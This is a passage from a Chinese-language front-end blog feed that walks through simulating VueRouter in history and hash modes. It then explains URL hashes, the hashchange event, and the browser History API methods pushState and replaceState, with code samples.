class="line">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span> <span class="attr">v-if</span>=<span class="string">"level==4"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用render函数将myslot动态生成</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'myslot'</span>:&#123;</span><br><span class="line">    render: <span class="function"><span class="keyword">function</span>(<span class="params">createElement</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> createElement(<span class="string">'h'</span> + <span class="keyword">this</span>.level, <span class="keyword">this</span>.$slot.default) <span class="comment">//h(n),helloworld</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Vue.use(plugin, arguments)</li></ul><ul><li><p>参数：<code>plugin(Function | Object)</code></p></li><li><p>用法：<br> 如果vue安装的组件类型必须为<code>Function</code>或者是<code>Object</code></p><p>如果是个对象，必须提供<strong>install</strong>方法</p><p>如果是一个函数，会被直接当作<code>install</code>函数执行</p><p><code>install</code>函数接受参数，默认第一个参数为Vue,其后参数为注册组件时传入的<code>arguments</code></p></li></ul><p><strong>实现思路</strong></p><ul><li>创建VueRouter插件，静态方法 install<ul><li>判断插件是否已经被加载</li><li>当Vue加载时把传入的router对象挂载到Vue实例上</li></ul></li><li>创建VueRouter类<ul><li>初始化，options，routeMap，app</li><li>createRouteMap()遍历所有路由信息，把组件和路由的映射记录到routeMap对象中</li><li>注册popstate事件，当路由地址发生变化，重新记录当前路径</li><li>创建router-link和router-view组件</li><li>当路径改变时，在routerMap中找到对应的组件，渲染router-view</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> _Vue = <span class="literal">null</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VueRouter</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Vue.use(VueRouter) 表示使用VueRouter插件，调用 install 方法</span></span><br><span class="line">    <span class="keyword">static</span> install(Vue)&#123;</span><br><span class="line">        <span class="comment">//1 判断当前插件是否被安装</span></span><br><span class="line">        <span class="keyword">if</span>(VueRouter.install.installed) <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">        VueRouter.install.installed = <span class="literal">true</span></span><br><span class="line">        <span class="comment">//2 把Vue的构造函数记录在全局，后面使用vue.component时会用到</span></span><br><span class="line">        _Vue = Vue</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//3 把创建Vue的实例传入的router对象注入到Vue实例</span></span><br><span class="line">        _Vue.mixin(&#123;</span><br><span class="line">            beforeCreate()&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">this</span>.$options.router)&#123;</span><br><span class="line">                    _Vue.prototype.$router = <span class="keyword">this</span>.$options.router <span class="comment">// 给所有的vue实例添加     </span></span><br><span class="line">                <span class="comment">// $ 一般是vue中自带的，和普通的属性没什么区别</span></span><br><span class="line">                    <span class="comment">// 在vue的原型上添加一个 $router，令其注册在vue实例上的 router</span></span><br><span class="line">                    <span class="comment">// 即等于 vue.$options.router</span></span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">constructor</span>(options)&#123;</span><br><span class="line">        <span class="keyword">this</span>.options = options</span><br><span class="line">        <span class="keyword">this</span>.routeMap = &#123;&#125;</span><br><span class="line">        <span class="comment">// observable</span></span><br><span class="line">        <span class="keyword">this</span>.data = _Vue.observable(&#123; </span><br><span class="line">            current:<span class="string">"/"</span>    <span class="comment">// current记录当前路由地址，"/"为当前的默认路径，为响应式数据</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">this</span>.init()</span><br><span class="line">    &#125;</span><br><span class="line">    init()&#123;</span><br><span class="line">        <span class="keyword">this</span>.createRouteMap()</span><br><span class="line">        <span class="keyword">this</span>.initComponent(_Vue)</span><br><span class="line">        <span class="keyword">this</span>.initEvent()</span><br><span class="line">    &#125;</span><br><span class="line">    createRouteMap()&#123;</span><br><span class="line">        <span class="comment">//遍历所有的路由规则 吧路由规则解析成键值对的形式存储到routeMap中</span></span><br><span class="line">        <span class="keyword">this</span>.options.routes.forEach(<span class="function"><span class="params">route</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.routeMap[route.path] = route.component</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    initComponent(Vue)&#123;</span><br><span class="line">        Vue.component(<span class="string">"router-link"</span>,&#123;</span><br><span class="line">            props:&#123;</span><br><span class="line">                to:<span class="built_in">String</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">// template: '&lt;a :href="to"&gt;&lt;slot&gt;&lt;/slot&gt;&lt;/a&gt;'</span></span><br><span class="line">            <span class="comment">// &lt;router-link to="/blog"&gt;Blog&lt;/router-link&gt; 就会把Blog替换插槽</span></span><br><span class="line">            <span class="comment">// 但是上面这种方式在运行时Vue不可用，不支持template</span></span><br><span class="line">            <span class="comment">// 完整版本的Vue就是把template编译成render函数，所以可以直接写render函数</span></span><br><span class="line">            render(h)&#123;</span><br><span class="line">                <span class="keyword">return</span> h(<span class="string">"a"</span>,&#123; <span class="comment">// 三个参数：标签，属性，子元素slot</span></span><br><span class="line">                    attrs:&#123;</span><br><span class="line">                        href:<span class="keyword">this</span>.to</span><br><span class="line">                    &#125;,</span><br><span class="line">                    on:&#123;</span><br><span class="line">                        click:<span class="keyword">this</span>.clickhander</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,[<span class="keyword">this</span>.$slots.default]) <span class="comment">// 默认插槽就是&lt;slot&gt;&lt;/slot&gt;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            methods:&#123;</span><br><span class="line">                clickhander(e)&#123;</span><br><span class="line">                    history.pushState(&#123;&#125;,<span class="string">""</span>,<span class="keyword">this</span>.to) <span class="comment">// pushState改地址而且不向服务器发请求</span></span><br><span class="line">                    <span class="keyword">this</span>.$router.data.current=<span class="keyword">this</span>.to</span><br><span class="line">                    e.preventDefault() <span class="comment">// 阻止默认行为</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> self = <span class="keyword">this</span></span><br><span class="line">        Vue.component(<span class="string">"router-view"</span>,&#123;</span><br><span class="line">            render(h)&#123;</span><br><span class="line">                <span class="comment">// 获取组件</span></span><br><span class="line">                <span class="keyword">const</span> cm=self.routeMap[self.data.current] <span class="comment">// current响应式数据，会重新渲染组件</span></span><br><span class="line">                <span class="keyword">return</span> h(cm)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    initEvent()&#123;</span><br><span class="line">        <span class="comment">// 点击浏览器的前进后退时，重新获取当前路径并记录到current</span></span><br><span class="line">        <span class="built_in">window</span>.addEventListener(<span class="string">"popstate"</span>,()=&gt;&#123;</span><br><span class="line">            <span class="keyword">this</span>.data.current = <span class="built_in">window</span>.location.pathname</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>前端路由是实现单页应用的基础 </li><li>可以通过this.$router对象获取当前路由对象中信息</li><li><p>window.pushState不会触发popstate时间，浏览器前进后退时会触发</p></li><li><p>当浏览器地址的路由为#/artical，router-link to=”/artical/101”生成的超链接的class属性会被设置为exact-active-class中的类样式，因为exact-active-class是用来设置路由地址精确匹配元素的样式</p></li></ul><h2 id="模拟hash模式vueRouter"><a href="#模拟hash模式vueRouter" class="headerlink" title="模拟hash模式vueRouter"></a>模拟hash模式vueRouter</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> _Vue = <span class="literal">null</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VueRouter</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Vue.use(VueRouter) 表示使用VueRouter插件，调用 install 方法</span></span><br><span class="line">    <span class="keyword">static</span> install(Vue)&#123;</span><br><span class="line">        <span class="comment">//1 判断当前插件是否被安装</span></span><br><span class="line">        <span class="keyword">if</span>(VueRouter.install.installed) <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">        VueRouter.install.installed = <span class="literal">true</span></span><br><span class="line">        <span class="comment">//2 把Vue的构造函数记录在全局，后面使用vue.component时会用到</span></span><br><span class="line">        _Vue = Vue</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//3 把创建Vue的实例传入的router对象注入到Vue实例</span></span><br><span class="line">        _Vue.mixin(&#123;</span><br><span class="line">            beforeCreate()&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">this</span>.$options.router)&#123;</span><br><span class="line">                    _Vue.prototype.$router = <span class="keyword">this</span>.$options.router <span class="comment">// 给所有的vue实例添加     </span></span><br><span class="line">                <span class="comment">// $ 一般是vue中自带的，和普通的属性没什么区别</span></span><br><span class="line">                    <span class="comment">// 在vue的原型上添加一个 $router，令其注册在vue实例上的 router</span></span><br><span class="line">                    <span class="comment">// 即等于 vue.$options.router</span></span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">constructor</span>(options)&#123;</span><br><span class="line">        <span class="keyword">this</span>.options = options</span><br><span class="line">        <span class="keyword">this</span>.routeMap = &#123;&#125;</span><br><span class="line">        <span class="comment">// observable</span></span><br><span class="line">        <span class="keyword">this</span>.data = _Vue.observable(&#123; </span><br><span class="line">            current:<span class="string">"/"</span>    <span class="comment">// current记录当前路由地址，"/"为当前的默认路径，为响应式数据</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">this</span>.init()</span><br><span class="line">    &#125;</span><br><span class="line">    init()&#123;</span><br><span class="line">        <span class="keyword">this</span>.createRouteMap()</span><br><span class="line">        <span class="keyword">this</span>.initComponent(_Vue)</span><br><span class="line">        <span class="keyword">this</span>.initEvent()</span><br><span class="line">    &#125;</span><br><span class="line">    createRouteMap()&#123;</span><br><span class="line">        <span class="comment">//遍历所有的路由规则 吧路由规则解析成键值对的形式存储到routeMap中</span></span><br><span class="line">        <span class="keyword">this</span>.options.routes.forEach(<span class="function"><span class="params">route</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.routeMap[route.path] = route.component</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    initComponent(Vue)&#123;</span><br><span class="line">        Vue.component(<span class="string">"router-link"</span>,&#123;</span><br><span class="line">            props:&#123;</span><br><span class="line">                to:<span class="built_in">String</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">// template: '&lt;a :href="to"&gt;&lt;slot&gt;&lt;/slot&gt;&lt;/a&gt;'</span></span><br><span class="line">            <span class="comment">// &lt;router-link to="/blog"&gt;Blog&lt;/router-link&gt; 就会把Blog替换插槽</span></span><br><span class="line">            <span class="comment">// 但是上面这种方式在运行时Vue不可用，不支持template</span></span><br><span class="line">            <span class="comment">// 完整版本的Vue就是把template编译成render函数，所以可以直接写render函数</span></span><br><span class="line">            render(h)&#123;</span><br><span class="line">                <span class="keyword">return</span> h(<span class="string">"a"</span>,&#123; <span class="comment">// 三个参数：标签，属性，子元素slot</span></span><br><span class="line">                    attrs:&#123;</span><br><span class="line">                        href: <span class="string">'#'</span> + <span class="keyword">this</span>.to</span><br><span class="line">                    &#125;,</span><br><span class="line">                    on:&#123;</span><br><span class="line">                        click:<span class="keyword">this</span>.clickhander</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,[<span class="keyword">this</span>.$slots.default]) <span class="comment">// 默认插槽就是&lt;slot&gt;&lt;/slot&gt;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            methods:&#123;</span><br><span class="line">                clickhander(e)&#123;</span><br><span class="line">                    <span class="built_in">window</span>.location.hash = <span class="string">'#'</span> + <span class="keyword">this</span>.to</span><br><span class="line">                    <span class="keyword">this</span>.$router.data.current=<span class="keyword">this</span>.to</span><br><span class="line">                    e.preventDefault() <span class="comment">// 阻止默认行为</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> self = <span class="keyword">this</span></span><br><span class="line">        Vue.component(<span class="string">"router-view"</span>,&#123;</span><br><span class="line">            render(h)&#123;</span><br><span class="line">                <span class="comment">// 获取组件</span></span><br><span class="line">                <span class="keyword">const</span> cm=self.routeMap[self.data.current] <span class="comment">// current响应式数据，会重新渲染组件</span></span><br><span class="line">                <span class="keyword">return</span> h(cm)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    initEvent() &#123;</span><br><span class="line">        <span class="built_in">window</span>.addEventListener(<span class="string">'load'</span>, <span class="keyword">this</span>.hashChange())</span><br><span class="line">        <span class="built_in">window</span>.addEventListener(<span class="string">'hashchange'</span>, <span class="keyword">this</span>.hashChange())</span><br><span class="line">    &#125;</span><br><span class="line">    hashChange() &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">window</span>.location.hash) &#123;</span><br><span class="line">            <span class="built_in">window</span>.location.hash = <span class="string">'#/'</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.data.current = <span class="built_in">window</span>.location.hash.substr(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>history模式和hash模式</title>
      <link href="2020/09/11/%E6%95%B4%E7%90%86-history%E6%A8%A1%E5%BC%8F%E5%92%8Chash%E6%A8%A1%E5%BC%8F/"/>
      <url>2020/09/11/%E6%95%B4%E7%90%86-history%E6%A8%A1%E5%BC%8F%E5%92%8Chash%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<ul><li>hash模式</li><li>history模式</li></ul><a id="more"></a><h2 id="hash模式"><a href="#hash模式" class="headerlink" title="hash模式"></a>hash模式</h2><p><strong>#的涵义</strong></p><ul><li>#代表网页中的一个位置,右面的字符就是代表的位置</li><li><code>http://localhost：8081/cbuild/index.html#first</code>就代表网页index.html的first位置。浏览器读取这个URL后，会自动将first位置滚动至可视区域。</li></ul><p><strong>#后的字符</strong></p><ul><li><p>在第一个#后面出现的任何字符，都会被浏览器解读为位置标识符。这意味着，这些字符都不会被发送到服务器端。</p></li><li><p>比如，下面URL的原意是指定一个颜色值：<code>http://www.example.com/?color=#fff</code>但是，浏览器实际发出的请求是”#fff”被省略了。只有将#转码为%23，浏览器才会将其作为实义字符处理。也就是说，上面的网址应该被写成：<code>http://example.com/?color=%23fff</code></p></li></ul><p><strong>改变#不触发网页重载</strong></p><ul><li>单单改变#后的部分，浏览器只会滚动到相应位置，不会重新加载网页。</li><li>比如，从<code>http://www.example.com/index.html#location1</code>改成<code>http://www.example.com/index.html#location2</code>浏览器不会重新向服务器请求index.html。</li></ul><p><strong>改变#会改变浏览器的访问历史</strong></p><ul><li>每一次改变#后的部分，都会在浏览器的访问历史中增加一个记录，使用”后退”按钮，就可以回到上一个位置。</li></ul><p><strong>window.location.hash读取#值</strong></p><ul><li>window.location.hash这个属性可读可写。读取时，可以用来判断网页状态是否改变；写入时，则会在不重载网页的前提下，创造一条访问历史记录。</li></ul><p><strong>onhashchange事件</strong></p><ul><li>这是一个HTML 5新增的事件，当#值发生变化时，就会触发这个事件。</li><li>window.addEventListener(“hashchange”,func, false);</li></ul><p><strong>思路</strong></p><blockquote><p>当URL的片段标识符更改时，将触发<strong>hashchange</strong>事件 (跟在＃符号后面的URL部分，包括＃符号),然后根据hash值做些路由跳转处理的操作.具体参数可以访问<code>location</code>查看</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hashchange 触发页面改变 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#/a"</span>&gt;</span>a<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#/b"</span>&gt;</span>b<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#/c"</span>&gt;</span>c<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"view"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> view = <span class="literal">null</span>;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 页面加载完不会触发 hashchange，这里主动触发一次 hashchange 事件</span></span></span><br><span class="line"><span class="javascript">      <span class="comment">// 该事件快于onLoad,所以需要在这里操作</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.addEventListener(<span class="string">'DOMContentLoaded'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        view = <span class="built_in">document</span>.querySelector(<span class="string">'#view'</span>);</span></span><br><span class="line"><span class="undefined">        viewChange();</span></span><br><span class="line"><span class="undefined">      &#125;);</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 监听路由变化</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.addEventListener(<span class="string">'hashchange'</span>, viewChange);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="comment">// 渲染视图</span></span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">viewChange</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">switch</span> (location.hash) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">case</span> <span class="string">'#/b'</span>:</span></span><br><span class="line"><span class="javascript">            view.innerHTML = <span class="string">'b'</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">case</span> <span class="string">'#/c'</span>:</span></span><br><span class="line"><span class="javascript">            view.innerHTML = <span class="string">'c'</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">default</span>:</span></span><br><span class="line"><span class="javascript">            view.innerHTML = <span class="string">'a'</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="history模式"><a href="#history模式" class="headerlink" title="history模式"></a>history模式</h2><p>window.history(可直接写成history)指向History对象，它表示当前窗口的浏览历史。</p><p>History对象保存了当前窗口访问过的所有页面网址</p><h3 id="length"><a href="#length" class="headerlink" title="length"></a>length</h3><ul><li>history.length属性保存着历史记录的url数量，初始时该值为1，如果当前窗口先后访问了三个网址，那么history对象就包括3项，history.length=3</li></ul><p><strong>跳转方法</strong></p><ul><li><strong>go()</strong> 接受一个整数为参数，移动到该整数指定的页面，比如<code>history.go(1)</code>相当于<code>history.forward()</code>,<code>history.go(-1)</code>相当于<code>history.back()</code>,<code>history.go(0)</code>相当于刷新当前页面</li><li><strong>back()</strong> 移动到上一个访问页面，等同于浏览器的后退键,常见的返回上一页就可以用<code>back()</code>，是从浏览器缓存中加载，而不是重新要求服务器发送新的网页</li><li><strong>forward()</strong> 移动到下一个访问页面，等同于浏览器的前进键</li></ul><p>如果移动的位置超出了访问历史的边界，以上三个方法并不报错，而是默默的失败</p><h3 id="history-pushState"><a href="#history-pushState" class="headerlink" title="history.pushState()"></a>history.pushState()</h3><p>history.pushstate() 方法接受三个参数，以此为：</p><ul><li><strong>state</strong>: 一个与指定网址相关的状态对象，popState事件触发时，该对象会传入回调函数，如果不需要这个对象，此处可填null</li><li><strong>title</strong>: 新页面的标题，但是所有浏览器目前都忽略这个值，因此这里可以填null</li><li><strong>url</strong>: 新的网址，必须与当前页面处在同一个域，浏览器的地址栏将显示这个网址</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假定当前网址是example.com/1.html，我们使用pushState方法在浏览记录(history对象)中添加一个记录</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> stateObj = &#123;<span class="attr">foo</span>:<span class="string">'bar'</span>&#125;;</span><br><span class="line">history.pushState(stateObj,<span class="string">'page 2'</span>,<span class="string">'2.html'</span>)</span><br></pre></td></tr></table></figure><blockquote><p>添加上边这个新纪录后，浏览器地址栏立刻显示<code>example.com/2.html</code>，但不会跳转到<code>2.html</code>，甚至也不会检查<code>2.html</code>是否存在，<strong>它只是成为浏览历史中的新纪录</strong>。这时，你在地址栏输入一个新的地址，然后点击了后退按钮，页面的<code>url</code>将显示<code>2.html</code>；你再点击以此后退按钮，<code>url</code>将显示<code>1.html</code></p></blockquote><p><strong>总之，pushState方法不会触发页面刷新，只是导致了history对象发生变化，地址栏会有反应</strong></p><p>如果pushState的url参数，设置了一个新的锚点值（即hash），并不会触发hashChange事件，如果设置了一个跨域网址，则会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//报错</span><br><span class="line">history.pushState(null,null,&apos;https://twitter.com/hello&apos;)</span><br></pre></td></tr></table></figure><p>上边代码中，pushState()想要插入一个跨域的网址，导致报错，这样设计的目的是防止恶意代码让用户以为他们是在另一个网站上.</p><h3 id="history-replaceState"><a href="#history-replaceState" class="headerlink" title="history.replaceState()"></a>history.replaceState()</h3><p><strong>history.replaceState()</strong> 方法的参数和 <strong>pushState()</strong> 方法一摸一样，区别是它修改浏览器历史当中的记录</p><p>假定当前页面是<code>example.com/example.html</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">history.pushState(&#123;<span class="attr">page</span>:<span class="number">1</span>&#125;,<span class="string">'title 1'</span>,<span class="string">'?page=1'</span>)</span><br><span class="line">history.pushState(&#123;<span class="attr">page</span>:<span class="number">2</span>&#125;,<span class="string">'title 2'</span>,<span class="string">'?page=2'</span>)</span><br><span class="line">history.replaceState(&#123;<span class="attr">page</span>:<span class="number">3</span>&#125;,<span class="string">'title 3'</span>,<span class="string">'?page=3'</span>)</span><br><span class="line"></span><br><span class="line">history.back() <span class="comment">//url显示为example.com/example.html?page=1</span></span><br><span class="line">history.back() <span class="comment">//url显示为example.com/example.html</span></span><br><span class="line">history.go(<span class="number">2</span>) <span class="comment">//url显示为example.com/example.html?page=3</span></span><br></pre></td></tr></table></figure><h3 id="popState-事件"><a href="#popState-事件" class="headerlink" title="popState 事件"></a>popState 